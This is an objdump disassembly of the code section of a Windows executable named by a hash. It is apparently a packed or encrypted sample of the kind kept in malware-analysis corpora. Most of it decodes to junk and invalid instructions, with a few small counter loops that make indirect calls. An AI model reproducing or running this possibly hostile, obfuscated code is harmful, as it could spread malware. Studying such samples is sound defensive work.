
bc13165bbb26235f953b76f9f954a73f4b9414c042335ebc3bcf396606fc6b59.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	and    bl,BYTE PTR [ecx]
  401016:	pop    ds
  401017:	mov    ah,0x7e
  401019:	jle    0x401099
  40101b:	jle    0x400f9f
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xceddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	or     BYTE PTR [edi+ecx*1],0x3b
  401031:	bswap  esp
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x0
  4010c9:	push   es
  4010ca:	cwde   
  4010cb:	push   es
  4010cc:	data16 (bad) 
  4010ce:	punpckhwd mm7,mm2
  4010d1:	test   al,0xe8
  4010d3:	das    
  4010d4:	xchg   ecx,edx
  4010d6:	adc    BYTE PTR [ebp+0x5bc7a7ed],cl
  4010dc:	mov    cl,0x42
  4010de:	or     DWORD PTR [ebp*8+0x1488f870],edx
  4010e5:	cmp    BYTE PTR [edi+0x2a],ch
  4010e8:	aas    
  4010e9:	icebp  
  4010ea:	and    ebp,DWORD PTR [eax]
  4010ec:	lds    ebx,FWORD PTR [ebx+0x39eff3bc]
  4010f2:	dec    ch
  4010f4:	jnp    0x40113d
  4010f6:	mov    esp,0x3e96667e
  4010fb:	(bad)  
  4010fc:	mov    ds:0x272b68f7,al
  401101:	test   BYTE PTR [esi-0x4b],bl
  401104:	(bad)  
  401105:	xchg   edx,eax
  401106:	cs dec esp
  401108:	rcr    BYTE PTR [ecx-0x30],cl
  40110b:	sub    bl,BYTE PTR [esi-0x7d7bb1d7]
  401111:	(bad)  
  401112:	jo     0x4010bd
  401114:	stos   DWORD PTR es:[edi],eax
  401115:	out    dx,eax
  401116:	pop    esp
  401117:	setne  BYTE PTR [edx-0x68a1d64d]
  40111e:	popa   
  40111f:	cmc    
  401120:	mov    edx,0xb20786fe
  401125:	lea    ecx,[esi]
  401127:	pop    ecx
  401128:	add    BYTE PTR [ecx+ebx*8-0xe3ee8b7],ah
  40112f:	inc    edi
  401130:	sbb    ah,0xb8
  401133:	mov    ebx,0x542da6da
  401138:	mov    bl,0x3f
  40113a:	push   ebx
  40113b:	ins    DWORD PTR es:[edi],dx
  40113c:	push   edi
  40113d:	sub    BYTE PTR [esi+0x799c452b],0xa5
  401144:	dec    edi
  401145:	hlt    
  401146:	dec    esi
  401147:	jecxz  0x4011ba
  401149:	repnz bound edx,QWORD PTR [edi+0x2c]
  40114d:	sub    eax,0xa580342
  401152:	push   ecx
  401153:	or     dh,bl
  401155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401156:	cmc    
  401157:	ficomp WORD PTR [edx+0x3bb51e1b]
  40115d:	shl    DWORD PTR [ebx+0x6d],0xa7
  401161:	jmp    FWORD PTR [ebx-0x494cfb2a]
  401167:	les    eax,FWORD PTR [edi]
  401169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40116a:	inc    ebx
  40116b:	imul   eax,edi,0x3e24725e
  401171:	lea    ecx,[esi+eiz*8-0x9]
  401175:	sbb    DWORD PTR [eax-0x7e796710],esi
  40117b:	pop    eax
  40117c:	bound  esp,QWORD PTR [edi+0x59]
  40117f:	xchg   ecx,eax
  401180:	fwait
  401181:	ins    DWORD PTR es:[edi],dx
  401182:	fcomp  QWORD PTR [edi+0x36fd33d6]
  401188:	rcr    DWORD PTR [eax-0x33],cl
  40118b:	and    bh,BYTE PTR [ecx]
  40118d:	aam    0xce
  40118f:	pop    eax
  401190:	lahf   
  401191:	and    cl,BYTE PTR [ebx]
  401193:	stc    
  401194:	pop    edx
  401195:	fdivp  st(1),st
  401197:	rcr    BYTE PTR [edx],cl
  401199:	jnp    0x4011fc
  40119b:	sub    ecx,edi
  40119d:	test   DWORD PTR [edx+0x7bdf9509],esp
  4011a3:	pop    ss
  4011a4:	es sub dl,al
  4011a7:	mov    eax,0xb3295f08
  4011ac:	jmp    0x40113d
  4011ae:	jmp    0x401212
  4011b0:	and    dl,BYTE PTR [eax-0x31]
  4011b3:	xchg   ebp,eax
  4011b4:	sbb    al,0x95
  4011b6:	adc    al,BYTE PTR [eax+0x35eeab26]
  4011bc:	jnp    0x401215
  4011be:	sub    eax,DWORD PTR [esi]
  4011c0:	inc    esi
  4011c1:	je     0x401232
  4011c3:	sbb    BYTE PTR [edi],0x7b
  4011c6:	in     eax,0x16
  4011c8:	mov    ecx,0xf5c09a4b
  4011cd:	nop
  4011ce:	icebp  
  4011cf:	fistp  DWORD PTR [esi-0x24]
  4011d2:	ficom  WORD PTR [eax+edi*8-0x2b312403]
  4011d9:	sub    BYTE PTR [ebp+0x6f],cl
  4011dc:	rcr    DWORD PTR [eax+ebx*8-0x41f59c79],cl
  4011e3:	sbb    ch,al
  4011e5:	int    0x4c
  4011e7:	js     0x4011f8
  4011e9:	cmp    ecx,ecx
  4011eb:	dec    ebp
  4011ec:	mov    ?,ebp
  4011ee:	in     al,0xc0
  4011f0:	sub    edx,DWORD PTR ds:0x3191fdd3
  4011f6:	js     0x40120b
  4011f8:	push   esp
  4011f9:	push   es
  4011fa:	int    0x5
  4011fc:	or     al,0x7
  4011fe:	sub    al,0x51
  401200:	mov    ebx,0x55fa106
  401205:	xchg   edi,eax
  401206:	call   DWORD PTR [edx+0x51]
  401209:	loopne 0x401233
  40120b:	cwde   
  40120c:	push   0x7b
  40120e:	sub    eax,DWORD PTR [edx-0x73]
  401211:	add    dh,BYTE PTR [ebx]
  401213:	jmp    0x4011be
  401215:	jle    0x401232
  401217:	xchg   ecx,eax
  401218:	mov    esi,0xa16f3380
  40121d:	imul   ecx,esi,0xffffffdd
  401220:	xlat   BYTE PTR ds:[ebx]
  401221:	jno    0x4011a6
  401223:	inc    ecx
  401224:	div    ah
  401226:	jecxz  0x40129f
  401228:	push   esi
  401229:	push   esp
  40122a:	jle    0x4012aa
  40122c:	inc    esi
  40122d:	push   ss
  40122e:	dec    eax
  40122f:	add    eax,0x4b5fd775
  401234:	adc    eax,0x4307579f
  401239:	fcom   DWORD PTR [ebx+esi*8]
  40123c:	pop    dx
  40123e:	add    al,0xde
  401240:	push   esi
  401241:	pop    esi
  401242:	pop    ebx
  401243:	ss mov dl,0x6a
  401246:	xor    DWORD PTR [ecx],0xc316c542
  40124c:	add    al,0x23
  40124f:	shl    dl,cl
  401251:	test   BYTE PTR [ebx],0x4b
  401254:	rcl    BYTE PTR [edi-0x2e],cl
  401257:	lock (bad) 
  401259:	jmp    0xb6b78ec7
  40125e:	mov    ch,0x5b
  401260:	push   ecx
  401261:	lock dec eax
  401263:	add    al,0xe8
  401265:	bound  edi,QWORD PTR [ebp+0xb]
  401268:	push   edx
  401269:	add    ebp,eax
  40126b:	or     al,0x72
  40126d:	mov    dh,0xd1
  40126f:	sti    
  401270:	mov    WORD PTR [ecx+0x51],fs
  401273:	enter  0x3dc,0x4f
  401277:	jnp    0x4012cf
  401279:	fld    DWORD PTR [ecx+0x6768fd07]
  40127f:	xchg   ebp,eax
  401280:	pop    ebx
  401281:	mov    ebx,0xf9af9f1
  401286:	inc    edi
  401287:	repz or bh,0x50
  40128b:	fst    QWORD PTR [ecx]
  40128d:	int3   
  40128e:	(bad)  
  40128f:	fadd   st,st(1)
  401291:	jmp    0x4012f0
  401293:	gs inc edx
  401295:	dec    ecx
  401296:	mov    ch,BYTE PTR [edx]
  401298:	jmp    0xaf4d:0x2b5b42ad
  40129f:	sti    
  4012a0:	js     0x40124e
  4012a2:	jmp    ebx
  4012a4:	loope  0x40126c
  4012a6:	outs   dx,BYTE PTR ds:[esi]
  4012a7:	sbb    DWORD PTR [esi-0x7e],esi
  4012aa:	test   ecx,esp
  4012ac:	push   edi
  4012ad:	xchg   BYTE PTR [edx-0xd],dl
  4012b0:	pop    eax
  4012b1:	pop    ss
  4012b2:	lods   eax,DWORD PTR ds:[esi]
  4012b3:	inc    ecx
  4012b4:	jmp    0x40124b
  4012b6:	daa    
  4012b7:	jl     0x40130b
  4012b9:	in     al,dx
  4012ba:	mov    edi,DWORD PTR [esi-0x30]
  4012bd:	fisttp QWORD PTR [edx+0x6bfb2140]
  4012c3:	inc    ebp
  4012c4:	xor    eax,0x7d6f642d
  4012c9:	es test al,0x7b
  4012cc:	sbb    ch,BYTE PTR [edx]
  4012ce:	xor    al,0x6d
  4012d0:	shr    DWORD PTR [esi],0xb4
  4012d3:	or     al,0x5e
  4012d5:	mov    dl,0x26
  4012d7:	add    ebp,ebp
  4012d9:	cmc    
  4012da:	xor    eax,0xe7fc9f34
  4012df:	mov    ebp,0x7f78e87b
  4012e4:	outs   dx,DWORD PTR ds:[esi]
  4012e5:	add    edi,DWORD PTR [edx+0x2c]
  4012e8:	imul   esi,DWORD PTR [esi],0xc3f94926
  4012ee:	pop    esi
  4012ef:	push   esp
  4012f0:	jns    0x401306
  4012f2:	loopne 0x401364
  4012f4:	pop    eax
  4012f5:	les    esi,FWORD PTR [ecx-0x320f1fe4]
  4012fb:	fiadd  DWORD PTR [edi]
  4012fd:	lea    ebp,[edx-0x6acfd404]
  401303:	push   esi
  401304:	fs pop es
  401306:	in     al,0x2c
  401308:	pmaxsw mm7,QWORD PTR [ecx+0x261605a3]
  40130f:	sbb    al,0xd2
  401311:	add    DWORD PTR [esi],0x657d512c
  401317:	mov    dl,0xfd
  401319:	sub    DWORD PTR [edi+0x6e68934a],esi
  40131f:	and    DWORD PTR [ebp+0xce900b8],0xfd749afd
  401329:	xor    BYTE PTR [ecx+eax*1+0x75890a46],cl
  401330:	cld    
  401331:	sbb    eax,0x40a76f73
  401336:	add    eax,0x5b229b16
  40133b:	push   ecx
  40133c:	test   eax,0x8e61941d
  401341:	xchg   ebp,eax
  401342:	addr16 inc esi
  401344:	je     0x40135f
  401346:	fxch   st(3)
  401348:	push   cs
  401349:	shr    DWORD PTR [ecx],1
  40134b:	adc    edi,edi
  40134d:	sbb    BYTE PTR [eax+eiz*1-0x50],cl
  401351:	adc    al,0xbf
  401353:	call   0x7c82:0x51b2080
  40135a:	loope  0x40135f
  40135c:	jge    0x4013bf
  40135e:	sahf   
  40135f:	shl    BYTE PTR [eax+0x30],0x1e
  401363:	popa   
  401364:	mov    edi,0x626e95ae
  401369:	enter  0x6041,0x5f
  40136d:	push   ecx
  40136e:	jo     0x401306
  401370:	lock push ecx
  401372:	mov    ch,BYTE PTR [edi]
  401374:	mov    ebp,0xe025fe01
  401379:	xor    al,0xb8
  40137b:	ins    BYTE PTR es:[edi],dx
  40137c:	add    dh,BYTE PTR [ebx]
  40137e:	retf   0xf9da
  401381:	mov    al,0x9
  401383:	xchg   ecx,eax
  401384:	scas   al,BYTE PTR es:[edi]
  401385:	(bad)  
  401386:	xchg   esi,eax
  401387:	adc    DWORD PTR [ebp-0xdd23b36],0x2daf6e2b
  401391:	loope  0x4013ac
  401393:	and    eax,0xeebbe0c0
  401398:	sbb    al,0x1d
  40139a:	push   ss
  40139b:	stos   DWORD PTR es:[edi],eax
  40139c:	sub    al,0xb5
  40139e:	or     bl,BYTE PTR [esi+0x7b8a8317]
  4013a4:	xchg   edi,eax
  4013a5:	adc    al,0x86
  4013a7:	fnstcw WORD PTR [edi]
  4013a9:	stc    
  4013aa:	lods   eax,DWORD PTR es:[esi]
  4013ac:	es icebp 
  4013ae:	jmp    0xa0de569
  4013b3:	mov    dl,0x83
  4013b5:	in     al,dx
  4013b6:	sub    al,0xc7
  4013b8:	inc    ebp
  4013b9:	clc    
  4013ba:	xor    al,BYTE PTR [ebp+0x3d19f89c]
  4013c0:	xchg   BYTE PTR [ebx+eax*2],al
  4013c3:	add    bh,al
  4013c5:	inc    ebp
  4013c6:	in     al,dx
  4013c7:	xor    eax,0x2bf89c85
  4013cc:	enter  0x7b8,0x95
  4013d0:	add    BYTE PTR [eax],al
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0xb750:0xc48b26e
  4014ab:	sbb    al,BYTE PTR [ebp+0x7e718208]
  4014b1:	jle    0x401435
  4014b3:	jno    0x401533
  4014b5:	jle    0x401528
  4014b7:	xchg   DWORD PTR [ebx-0xec98c1d],ebx
  4014bd:	mov    esi,0xad913661
  4014c2:	mov    bl,0x3
  4014c4:	jmp    0x401452
  4014c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014c7:	lock cmc 
  4014c9:	popf   
  4014ca:	jmp    0x36157e41
  4014cf:	inc    ebx
  4014d0:	mov    edi,0xc6c9481a
  4014d5:	mov    dh,0xa4
  4014d7:	out    0xe,al
  4014d9:	(bad)  
  4014da:	mov    eax,ds:0xeb33b210
  4014df:	mov    ecx,0x7e665f88
  4014e4:	mov    BYTE PTR [eax-0x1a],ah
  4014e7:	dec    ecx
  4014e8:	out    dx,al
  4014e9:	int3   
  4014ea:	jg     0x401514
  4014ec:	(bad)  
  4014ed:	in     eax,0xd8
  4014ef:	scas   eax,DWORD PTR es:[edi]
  4014f0:	imul   eax,DWORD PTR [eax-0x69],0xd37f7170
  4014f7:	fist   DWORD PTR [esi+0x47153b10]
  4014fd:	mov    ebx,0x5aeef54a
  401502:	pop    es
  401503:	cwde   
  401504:	jne    0x40151f
  401506:	ret    0xb68b
  401509:	inc    eax
  40150a:	addr16 jg 0x4014f2
  40150d:	fnsave [edi+0x754e2c40]
  401513:	xor    ecx,ebx
  401515:	xchg   esi,eax
  401516:	(bad)  
  401517:	repnz fst DWORD PTR [edi+0x25]
  40151b:	rcl    ecx,1
  40151d:	jg     0x401590
  40151f:	retf   0x27d2
  401522:	adc    bh,BYTE PTR [ebp+edi*4+0x64524551]
  401529:	mov    bh,0xdd
  40152b:	pushf  
  40152c:	cli    
  40152d:	loope  0x4014bd
  40152f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401530:	mov    edx,0x681673d7
  401535:	push   ebx
  401536:	adc    BYTE PTR [eax-0x90c8b1e],bl
  40153c:	stc    
  40153d:	bound  eax,QWORD PTR [eax+0x38]
  401540:	mov    al,ds:0xb5b137a5
  401545:	jp     0x401515
  401547:	pushf  
  401548:	push   ebp
  401549:	jbe    0x4015b8
  40154b:	mov    ah,0x73
  40154d:	or     eax,0xdd60dcd5
  401552:	mov    ch,0x55
  401554:	inc    esi
  401555:	mov    ah,0xd1
  401557:	add    esp,esi
  401559:	adc    ebx,DWORD PTR [edi+0x6f]
  40155c:	ret    0x4397
  40155f:	data16 jno 0x401508
  401562:	xor    DWORD PTR [edx],ebp
  401564:	and    edi,DWORD PTR [edx+0x69]
  401567:	shr    DWORD PTR [esi],1
  401569:	out    dx,eax
  40156a:	sub    al,BYTE PTR [eax+0x1356dcc5]
  401570:	cmp    eax,0x3c2ed3d9
  401575:	int3   
  401576:	pop    ds
  401577:	push   ss
  401578:	adc    eax,0xbded8546
  40157d:	inc    eax
  40157e:	dec    esi
  40157f:	mov    ah,0xa0
  401581:	out    0x19,al
  401583:	arpl   WORD PTR [ebp+0x79478b2d],bp
  401589:	ins    DWORD PTR es:[edi],dx
  40158a:	dec    esi
  40158b:	ins    DWORD PTR es:[edi],dx
  40158c:	rcr    dh,0x16
  40158f:	aam    0xf0
  401591:	mov    edi,0xb172d419
  401596:	gs daa 
  401598:	add    BYTE PTR [ecx+edx*2],cl
  40159b:	and    BYTE PTR cs:[edx],bl
  40159e:	xchg   ecx,eax
  40159f:	xchg   edi,eax
  4015a0:	or     eax,0xb61ad779
  4015a5:	jmp    0xf6b1:0x5e41f615
  4015ac:	jae    0x401534
  4015ae:	pop    ss
  4015af:	scas   al,BYTE PTR es:[edi]
  4015b0:	and    BYTE PTR [esi],ch
  4015b2:	jecxz  0x401596
  4015b4:	fadd   DWORD PTR [ecx]
  4015b6:	repnz sub eax,0x60a99815
  4015bc:	and    DWORD PTR [ebx-0x10],eax
  4015bf:	adc    esp,DWORD PTR ds:[ecx+edx*1]
  4015c3:	pushf  
  4015c4:	mov    edx,0x2fff1db1
  4015c9:	push   0x96607252
  4015ce:	lods   al,BYTE PTR ds:[esi]
  4015cf:	inc    ecx
  4015d0:	pushf  
  4015d1:	repnz retf 0xd7a1
  4015d5:	and    DWORD PTR [esi-0x344b08ec],ebp
  4015db:	imul   ebp,eax,0x32
  4015de:	mov    ebx,0x7151da3a
  4015e3:	aas    
  4015e4:	js     0x401609
  4015e6:	jge    0x4015ae
  4015e8:	pushf  
  4015e9:	sub    cl,cl
  4015eb:	mov    eax,ds:0x6d0e8167
  4015f0:	(bad)  
  4015f1:	data16 inc ch
  4015f4:	ins    DWORD PTR es:[edi],dx
  4015f5:	clc    
  4015f6:	(bad)  
  4015f7:	xchg   ebx,eax
  4015f8:	and    al,0xa5
  4015fa:	mov    ecx,0x3b7983f4
  4015ff:	pop    ebp
  401600:	jmp    0x4015b6
  401602:	push   es
  401603:	aad    0xae
  401605:	xor    eax,0xbce13ae5
  40160a:	test   eax,0xa974304
  40160f:	mov    eax,ds:0x62a61ecc
  401614:	scas   al,BYTE PTR es:[edi]
  401615:	loope  0x40165c
  401617:	js     0x401692
  401619:	sti    
  40161a:	xor    eax,DWORD PTR [ebx]
  40161c:	push   ss
  40161d:	inc    esi
  40161e:	xchg   edx,eax
  40161f:	fild   WORD PTR [ebp+0x3a]
  401622:	sbb    al,0x72
  401624:	push   esi
  401625:	es ret 0x16c3
  401629:	lock imul ebp,edi,0x60
  40162d:	dec    edi
  40162e:	mov    ebx,0xfc54bc1d
  401633:	xchg   ebx,eax
  401634:	js     0x401626
  401636:	repz (bad) 
  401638:	(bad)  
  401639:	shr    BYTE PTR [eax],1
  40163b:	outs   dx,BYTE PTR cs:[esi]
  40163d:	xchg   ecx,eax
  40163e:	cli    
  40163f:	dec    ecx
  401640:	fistp  WORD PTR [ebp+0x6e]
  401643:	je     0x401686
  401645:	imul   eax,DWORD PTR [ebx-0x7c024fa5],0xae0857e8
  40164f:	inc    ebp
  401650:	mov    eax,ds:0x9efb4e6d
  401655:	dec    ebx
  401656:	ins    BYTE PTR es:[edi],dx
  401657:	pop    esp
  401658:	gs aam 0x1f
  40165b:	repz mov ds:0x50061a62,al
  401661:	aam    0x1e
  401663:	popf   
  401664:	syscall 
  401666:	bound  ebp,QWORD PTR [eax-0x2a9abdfc]
  40166c:	dec    ecx
  40166d:	or     dl,dl
  40166f:	mov    eax,ds:0x74a53213
  401674:	icebp  
  401675:	loopne 0x40162d
  401677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401678:	jno    0x4015fb
  40167a:	std    
  40167b:	push   es
  40167c:	and    al,0x9f
  40167e:	jo     0x401606
  401680:	aam    0x77
  401682:	stos   DWORD PTR es:[edi],eax
  401683:	mov    cl,0x43
  401685:	xchg   edx,eax
  401686:	pmuludq mm6,QWORD PTR [esi+0x5e]
  40168a:	xor    DWORD PTR [ebp-0x59],ecx
  40168d:	xchg   edx,eax
  40168e:	mov    ebx,0xbbbeb968
  401693:	adc    bh,BYTE PTR [edi+edx*8]
  401696:	add    ebp,DWORD PTR [ebx]
  401698:	xchg   esp,eax
  401699:	out    0x3a,al
  40169b:	jmp    0x40166f
  40169d:	jg     0x4016e2
  40169f:	loop   0x4016da
  4016a1:	aam    0x21
  4016a3:	sbb    al,0x80
  4016a5:	pop    DWORD PTR [edi]
  4016a7:	push   ebx
  4016a8:	push   ecx
  4016a9:	out    0xb6,al
  4016ab:	sbb    eax,0xa0268f8a
  4016b0:	or     edi,DWORD PTR [ecx-0x7d]
  4016b3:	sar    BYTE PTR [ebx+esi*2-0x22],1
  4016b7:	stc    
  4016b8:	adc    eax,0xca3227d3
  4016bd:	out    0xc7,eax
  4016bf:	mov    esi,0x3ce923ba
  4016c4:	lds    esi,FWORD PTR [edi-0x47]
  4016c7:	dec    eax
  4016c8:	ror    BYTE PTR [ebp+0x30],1
  4016cb:	int3   
  4016cc:	or     al,0x3
  4016ce:	in     eax,0x22
  4016d0:	push   esp
  4016d1:	rcr    DWORD PTR ds:0x4c3ea18,cl
  4016d7:	jne    0x401700
  4016d9:	xor    bl,ch
  4016db:	cmp    eax,0x23b53b77
  4016e0:	fsubr  QWORD PTR [eax+0x1b8d393f]
  4016e6:	div    bh
  4016e8:	dec    eax
  4016e9:	scas   eax,DWORD PTR es:[edi]
  4016ea:	mov    esp,DWORD PTR [eax+0x1c]
  4016ed:	add    esi,edx
  4016ef:	ss and eax,0xaa7e1bb9
  4016f5:	push   edx
  4016f6:	dec    edi
  4016f7:	inc    ecx
  4016f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016f9:	lods   eax,DWORD PTR ds:[esi]
  4016fa:	lods   al,BYTE PTR ds:[esi]
  4016fb:	xchg   ebx,eax
  4016fc:	je     0x40177a
  4016fe:	push   edi
  4016ff:	dec    ebx
  401700:	(bad)  
  401702:	cwde   
  401703:	dec    eax
  401704:	cs push ebx
  401706:	adc    al,0xc9
  401708:	jne    0x401781
  40170a:	lds    ebp,FWORD PTR [eax-0x3ce302b0]
  401710:	push   ebx
  401711:	dec    ebp
  401712:	aaa    
  401713:	fs retf 0x5f8b
  401717:	stc    
  401718:	mov    esp,0xb8dbcfc3
  40171d:	out    0xf7,eax
  40171f:	adc    ecx,esp
  401721:	xchg   esp,eax
  401722:	lds    edi,FWORD PTR [ebp-0x7af6361f]
  401728:	fdisi(8087 only) 
  40172b:	mov    bh,0x8
  40172d:	ret    
  40172e:	sub    al,0x82
  401730:	sbb    dl,BYTE PTR [edi+0x4b]
  401733:	das    
  401734:	mov    esp,0x818597b5
  401739:	retf   0x33ae
  40173c:	call   0xf2ce:0xe414accf
  401743:	(bad)  
  401744:	repz pop edx
  401746:	adc    DWORD PTR [eax],0x3f
  401749:	cwde   
  40174a:	les    edi,FWORD PTR [ecx+0x5eb4eb92]
  401750:	imul   ecx,DWORD PTR [esi-0x70e96d95],0x87d3b5b6
  40175a:	push   edx
  40175b:	cwde   
  40175c:	sub    bh,BYTE PTR [eax-0x93bceeb]
  401762:	scas   eax,DWORD PTR es:[edi]
  401763:	test   ecx,ecx
  401765:	fidivr WORD PTR [eax]
  401767:	fwait
  401768:	outs   dx,BYTE PTR cs:[esi]
  40176a:	test   eax,0x1db22e72
  40176f:	pop    ebx
  401770:	clc    
  401771:	jl     0x40170e
  401773:	jmp    FWORD PTR [eax+0x42]
  401776:	ret    0x66a3
  401779:	adc    edi,DWORD PTR [esi-0x78691049]
  40177f:	pop    ebp
  401780:	add    edx,DWORD PTR [edx]
  401782:	adc    al,BYTE PTR [ebp+0x1e]
  401785:	call   0xd270:0x6a0a6ab8
  40178c:	std    
  40178d:	ret    0x149b
  401790:	add    cl,BYTE PTR [ecx-0x5e]
  401793:	jbe    0x4017e3
  401795:	outs   dx,BYTE PTR ds:[esi]
  401796:	dec    ecx
  401797:	xchg   ebx,eax
  401798:	inc    DWORD PTR [ebx+0x3f306487]
  40179e:	ss shl cl,cl
  4017a1:	test   DWORD PTR [edx+0x30],edi
  4017a4:	jbe    0x401751
  4017a6:	inc    BYTE PTR [edx]
  4017a8:	jne    0x401829
  4017aa:	dec    ebx
  4017ab:	fidiv  DWORD PTR [eax-0x66c89889]
  4017b1:	push   edx
  4017b2:	retf   0xac0f
  4017b5:	call   0xe873:0xf2d9be7d
  4017bc:	mov    ch,0x9f
  4017be:	push   cs
  4017bf:	xor    ebx,DWORD PTR [edi+edx*2-0x8]
  4017c3:	ds imul esp,esp,0xb057aaa
  4017ca:	hlt    
  4017cb:	inc    ebp
  4017cc:	test   bl,ch
  4017ce:	xor    DWORD PTR [edx],ebx
  4017d0:	daa    
  4017d1:	sbb    eax,0x68445797
  4017d6:	adc    al,BYTE PTR [edi]
  4017d8:	js     0x4017bd
  4017da:	pop    ebp
  4017db:	in     eax,dx
  4017dc:	mov    esi,0xbb8833a8
  4017e1:	push   0x9e9cb01
  4017e6:	sub    BYTE PTR [esi],dh
  4017e8:	dec    edx
  4017e9:	fidivr DWORD PTR ds:0xab84d60
  4017ef:	ins    BYTE PTR es:[edi],dx
  4017f0:	fdiv   QWORD PTR [ebp-0x57b37be8]
  4017f6:	(bad)  
  4017f7:	or     eax,0x572db5ee
  4017fc:	out    dx,eax
  4017fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fe:	xchg   BYTE PTR ds:0x565a696f,ah
  401804:	sbb    esi,DWORD PTR [ebx]
  401806:	out    dx,eax
  401807:	add    BYTE PTR [ebx+esi*2],0x26
  40180b:	mov    cs,WORD PTR [ebx]
  40180d:	hlt    
  40180e:	imul   edi,DWORD PTR [esi],0x8f607481
  401814:	mov    ebp,0x12392260
  401819:	gs dec ebp
  40181b:	fs and cl,0x5a
  40181f:	test   eax,0x4041bfb1
  401824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401825:	outs   dx,DWORD PTR ds:[esi]
  401826:	pushw  0x19a9
  40182a:	lock mov bl,0x28
  40182d:	mov    bl,0x75
  40182f:	lods   eax,DWORD PTR ds:[esi]
  401830:	popa   
  401831:	jnp    0x4017ff
  401833:	mov    ch,0x3e
  401835:	add    bh,BYTE PTR [eax+0x2d6396f2]
  40183b:	mov    dh,0xe2
  40183d:	jb     0x4017f3
  40183f:	cli    
  401840:	push   esi
  401841:	outs   dx,DWORD PTR ds:[esi]
  401842:	sub    bh,BYTE PTR [ecx-0x7900dfb]
  401848:	pusha  
  401849:	mov    dh,0x89
  40184b:	inc    ebp
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
